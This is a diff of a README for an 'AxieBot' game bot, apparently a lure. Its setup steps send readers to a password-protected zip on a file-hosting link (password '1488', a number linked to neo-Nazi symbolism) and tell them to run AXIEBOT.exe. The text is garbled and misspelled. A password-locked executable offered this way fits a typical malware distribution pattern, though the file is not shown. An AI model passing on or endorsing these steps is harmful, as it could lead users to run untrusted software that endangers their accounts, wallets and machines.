@@ -6,7 +6,7 @@ Setup
 
 1.Change game resolution to full-screen (or full-scren windowed) and close Sk y avis game client
 2.Download archive with software https://www.mediafire.com/file/45lsw0mjspoadam/AxieBot.zip/file Password:1488
-3.Launch AXIEBOT.exe with correct settings 
+3.Launch AXIEBOT.exe with correct settings
 W
 Im not recommend you to play morethan 24 hours per acoun. I m  no take resonsibility for any bans or blocks.
 Copyrigh  
